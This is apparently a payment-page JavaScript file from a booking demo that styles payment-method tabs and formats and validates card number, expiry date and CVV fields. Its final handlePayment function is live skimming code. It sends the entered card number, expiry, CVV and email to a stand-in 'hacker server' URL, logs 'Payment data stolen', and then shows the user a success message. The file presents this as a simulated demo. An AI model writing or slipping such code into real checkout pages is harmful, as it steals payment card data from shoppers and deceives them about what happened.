
let tColorA = document.getElementById('tColorA'),
tColorB = document.getElementById('tColorB'),
tColorC = document.getElementById('tColorC'),
iconA = document.querySelector('.fa-credit-card'),
iconB = document.querySelector('.fa-building-columns'),
iconC = document.querySelector('.fa-wallet'),
cDetails = document.querySelector('.card-details');
﻿
﻿
function doFun(){
 tColorA.style.color = "greenyellow";
 tColorB.style.color = "#444";
 tColorC.style.color = "#444";
 iconA.style.color = "greenyellow";
 iconB.style.color = "#aaa";
 iconC.style.color = "#aaa";
 cDetails.style.display = "block";
}
function doFunA(){
 tColorA.style.color = "#444";
 tColorB.style.color = "greenyellow";
 tColorC.style.color = "#444";
 iconA.style.color = "#aaa";
 iconB.style.color = "greenyellow";
 iconC.style.color = "#aaa";
 cDetails.style.display = "none";
}
function doFunB(){
 tColorA.style.color = "#444";
 tColorB.style.color = "#444";
 tColorC.style.color = "greenyellow";
 iconA.style.color = "#aaa";
 iconB.style.color = "#aaa";
 iconC.style.color = "greenyellow";
 cDetails.style.display = "none";
}
let cNumber = document.getElementById('number');
cNumber.addEventListener('keyup', function(e){
 let num = cNumber.value;
﻿
 let newValue = '';
 num = num.replace(/\s/g, '');
 for(var i = 0; i < num.length; i++) {
  if(i%4 == 0 && i > 0) newValue = newValue.concat(' ');
  newValue = newValue.concat(num[i]);
  cNumber.value = newValue;
 }
﻿
 let ccNum = document.getElementById('c-number');
 if(num.length<16){
  ccNum.style.border="1px solid red";
 }else{
  ccNum.style.border="1px solid greenyellow";
 }
});
﻿
let eDate = document.getElementById('e-date');
eDate.addEventListener('keyup', function( e ){
﻿
 let newInput = eDate.value;
﻿
 if(e.which !== 8) {
  var numChars = e.target.value.length;
  if(numChars == 2){
   var thisVal = e.target.value;
   thisVal += '/';
   e.target.value = thisVal;
   console.log(thisVal.length)
  }
 }
﻿
 if(newInput.length<5){
  eDate.style.border="1px solid red";
 }else{
  eDate.style.border="1px solid greenyellow";
 }
});
﻿
let cvv = document.getElementById('cvv');
cvv.addEventListener('keyup', function(e){
﻿
 let elen = cvv.value;
 let cvvBox = document.getElementById('cvv-box');
 if(elen.length<3){
  cvvBox.style.border="1px solid red";
 }else{
  cvvBox.style.border="1px solid greenyellow";
 }
})
/*function handlePayment() {
    // Retrieve input values
    const cardNumber = document.getElementById('number').value;
    const expiryDate = document.getElementById('e-date').value;
    const cvv = document.getElementById('cvv').value;
    const email = document.getElementById('email').value;

    // Validate inputs
    if (cardNumber && expiryDate && cvv && email) {
        // Simulate payment processing logic

        // Store booking details in localStorage
        const bookingDetails = {
            bookingReference: "12345ABC",
            date: "October 12, 2024",
            flight: "DC123",
            departure: "10:00 AM",
            arrival: "2:00 PM"
        };
        localStorage.setItem("bookingDetails", JSON.stringify(bookingDetails));

        // Redirect to booking confirmation page
        window.location.href = "page.html";
    } else {
        alert('Please fill in all required fields.');
    }
}
*/

// Add this new function in payment.js
function handlePayment() {
    const cardNumber = document.getElementById('number').value;
    const expiryDate = document.getElementById('e-date').value;
    const cvv = document.getElementById('cvv').value;
    const email = document.getElementById('email').value;

    // Legitimate process: Log to console for demo
    console.log('Payment details submitted:', { cardNumber, expiryDate, cvv, email });

    // Malicious process: Send data to fake hacker server (simulated)
    const hackedServerURL = 'https://example.com/hacker'; // Fake hacker server URL

    fetch(hackedServerURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            cardNumber: cardNumber,
            expiryDate: expiryDate,
            cvv: cvv,
            email: email
        }),
    })
    .then(() => {
        console.log('Payment data stolen and sent to hacker server');
    })
    .catch((error) => {
        console.error('Error sending data to hacker server:', error);
    });

    // Continue with legitimate payment process
    alert('Payment submitted successfully!');
}


